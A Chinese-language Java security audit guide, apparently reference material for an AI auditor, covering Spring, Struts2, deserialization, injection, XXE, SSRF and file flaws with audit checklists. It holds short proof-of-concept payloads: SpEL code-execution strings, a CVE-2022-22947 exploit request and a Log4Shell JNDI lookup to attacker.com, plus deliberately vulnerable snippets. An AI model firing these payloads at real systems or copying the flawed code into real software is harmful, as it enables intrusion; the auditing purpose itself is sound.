# Java 代码审计

Java 是企业级应用的主流语言，其代码审计涉及框架漏洞、反序列化、注入等多个方面。

## Spring 框架审计

### SpEL 表达式注入

**危险场景**：
```java
// 不安全的SpEL使用
@RequestMapping("/vuln")
public String vuln(@RequestParam String expression) {
    ExpressionParser parser = new SpelExpressionParser();
    Expression exp = parser.parseExpression(expression);
    return exp.getValue().toString();
}
```

**利用**：
```java
// RCE payload
T(java.lang.Runtime).getRuntime().exec("calc")
T(java.lang.ProcessBuilder).new(new String[]{"calc"}).start()
```

**审计要点**：
- 搜索 `SpelExpressionParser`
- 检查用户输入是否直接进入表达式
- 查找 `@Value` 注解中的动态值

### Spring Boot Actuator

**敏感端点**：
- `/actuator/env` - 环境变量
- `/actuator/heapdump` - 堆转储
- `/actuator/trace` - 请求追踪
- `/actuator/mappings` - 路由映射

**审计要点**：
- 检查 Actuator 是否暴露
- 验证认证和授权
- 查看敏感信息泄露

### Spring Cloud Gateway

**CVE-2022-22947**：
```java
// SpEL注入导致RCE
POST /actuator/gateway/routes/test
{
  "predicates": [{
    "name": "Path",
    "args": {"_genkey_0": "/test"}
  }],
  "filters": [{
    "name": "RewritePath",
    "args": {
      "_genkey_0": "#{T(java.lang.Runtime).getRuntime().exec('calc')}",
      "_genkey_1": "/${path}"
    }
  }],
  "uri": "http://example.com"
}
```

## Struts2 审计

### OGNL 表达式注入

**常见漏洞**：
- S2-001 到 S2-062
- OGNL 表达式执行
- 文件上传绕过

**危险代码**：
```java
// 不安全的OGNL使用
String expression = request.getParameter("expr");
Object value = Ognl.getValue(expression, context, root);
```

**审计要点**：
- 检查 Struts2 版本
- 搜索 `Ognl.getValue`
- 查找动态方法调用

## 反序列化漏洞

### 常见 Gadget 链

**Commons Collections**：
```java
// CC1-CC7 利用链
TransformedMap
LazyMap
InvokerTransformer
ChainedTransformer
```

**审计要点**：
- 搜索 `ObjectInputStream`
- 检查 `readObject()` 调用
- 查找反序列化入口点
- 验证是否使用危险库

### Fastjson

**版本漏洞**：
- < 1.2.24：反序列化RCE
- < 1.2.68：多个绕过
- AutoType 绕过

**危险代码**：
```java
// 不安全的Fastjson使用
String json = request.getParameter("data");
Object obj = JSON.parseObject(json);

// AutoType开启
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```

**审计要点**：
- 检查 Fastjson 版本
- 查找 `JSON.parseObject`
- 验证 AutoType 配置

### Jackson

**危险配置**：
```java
// 不安全的配置
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();
```

**审计要点**：
- 搜索 `enableDefaultTyping`
- 检查 `@JsonTypeInfo` 注解
- 验证多态类型处理

## SQL 注入

### MyBatis

**危险用法**：
```java
// 不安全的${}使用
@Select("SELECT * FROM users WHERE id = ${id}")
User getUserById(String id);

// 安全的#{}使用
@Select("SELECT * FROM users WHERE id = #{id}")
User getUserById(String id);
```

**审计要点**：
- 搜索 `${` 符号
- 检查动态 SQL 构造
- 验证 ORDER BY、LIMIT 等场景

### JDBC

**危险代码**：
```java
// 字符串拼接
String sql = "SELECT * FROM users WHERE name = '" + username + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(sql);
```

**审计要点**：
- 搜索字符串拼接的 SQL
- 检查 `Statement` 使用
- 验证 `PreparedStatement` 使用

## XXE 漏洞

### XML 解析

**危险代码**：
```java
// 不安全的XML解析
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(inputStream);
```

**安全配置**：
```java
// 禁用外部实体
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**审计要点**：
- 搜索 XML 解析器
- 检查外部实体配置
- 验证 DTD 处理

## SSRF 漏洞

### URL 请求

**危险代码**：
```java
// 不安全的URL请求
String url = request.getParameter("url");
URL obj = new URL(url);
HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
```

**审计要点**：
- 搜索 `URL`、`HttpClient`
- 检查 URL 白名单
- 验证内网访问限制

## 文件操作漏洞

### 文件上传

**危险代码**：
```java
// 不安全的文件上传
String filename = file.getOriginalFilename();
File dest = new File(uploadPath + filename);
file.transferTo(dest);
```

**审计要点**：
- 检查文件类型验证
- 验证文件名过滤
- 查看存储路径控制

### 路径穿越

**危险代码**：
```java
// 不安全的文件读取
String filename = request.getParameter("file");
File file = new File(basePath + filename);
FileInputStream fis = new FileInputStream(file);
```

**审计要点**：
- 搜索文件操作函数
- 检查路径拼接
- 验证路径规范化

## JNDI 注入

### 危险场景

**Log4j2 (Log4Shell)**：
```java
// CVE-2021-44228
logger.info("User: " + userInput);
// ${jndi:ldap://attacker.com/evil}
```

**其他场景**：
```java
// 不安全的JNDI查询
String name = request.getParameter("name");
Context ctx = new InitialContext();
Object obj = ctx.lookup(name);
```

**审计要点**：
- 检查 Log4j2 版本
- 搜索 `InitialContext`
- 验证 JNDI 查询输入

## 命令注入

### Runtime.exec

**危险代码**：
```java
// 不安全的命令执行
String cmd = request.getParameter("cmd");
Runtime.getRuntime().exec(cmd);

// 字符串拼接
Runtime.getRuntime().exec("ping " + ip);
```

**审计要点**：
- 搜索 `Runtime.exec`
- 检查 `ProcessBuilder`
- 验证命令参数过滤

## 审计工具

### 静态分析

**FindSecBugs**：
```bash
# Maven插件
mvn compile spotbugs:spotbugs
```

**CodeQL**：
```ql
// 查找SQL注入
import java
from MethodAccess ma
where ma.getMethod().getName() = "executeQuery"
select ma
```

**Semgrep**：
```yaml
rules:
  - id: sql-injection
    pattern: |
      $STMT.executeQuery($SQL)
    message: Potential SQL injection
```

### 依赖检查

**OWASP Dependency-Check**：
```bash
mvn org.owasp:dependency-check-maven:check
```

**Snyk**：
```bash
snyk test
```

## 审计清单

### 配置检查
- [ ] 调试模式是否关闭
- [ ] 敏感信息是否加密
- [ ] 错误信息是否详细
- [ ] 日志是否记录敏感数据

### 认证授权
- [ ] 认证机制是否安全
- [ ] 会话管理是否正确
- [ ] 权限控制是否完善
- [ ] JWT 是否安全使用

### 输入验证
- [ ] 所有输入是否验证
- [ ] 白名单是否使用
- [ ] 编码是否正确
- [ ] 长度是否限制

### 输出编码
- [ ] HTML 输出是否编码
- [ ] JSON 输出是否安全
- [ ] XML 输出是否转义
- [ ] SQL 是否参数化

---

**AI 发挥空间**：
- 根据框架版本识别已知漏洞
- 分析代码逻辑发现业务漏洞
- 追踪数据流发现注入点
- 开发自动化审计脚本

**反幻觉提示**：
- 不要假设所有框架都有相同的漏洞
- 验证具体的框架版本和配置
- 测试漏洞的实际可利用性
- 注意不同版本的API差异
- 某些漏洞可能需要特定条件才能触发
